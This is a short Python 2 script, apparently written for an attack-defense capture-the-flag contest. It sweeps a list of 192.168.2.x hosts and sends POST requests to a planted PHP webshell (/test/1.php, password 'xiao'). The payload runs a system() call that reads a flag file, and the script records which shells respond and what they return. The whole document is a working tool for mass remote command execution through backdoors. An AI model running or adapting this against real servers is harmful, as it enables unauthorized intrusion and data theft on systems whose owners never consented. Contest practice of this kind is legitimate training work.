#coding=utf-8
import requests
url="http://192.168.2."
url1=""
shell="/test/1.php"
passwd="xiao" 
port="80"
payload = {passwd: 'system(\'cat /var/www/html/flag/flag.txt\');'}
f=open("webshelllist.txt","w+") 
f1=open("flag.txt","w")
for i in [62,51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: 
    url1=url+str(i)+":"+port+shell
    try:
        res=requests.post(url1,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            print url1+" connect shell sucess,flag is "+res.text
            print >>f1,url1+" connect shell sucess,flag is "+res.text
            print >>f,url1+","+passwd
        else:
            print "shell 404"
    except:
        print url1+" connect shell fail"
		
f.close()
f1.close()
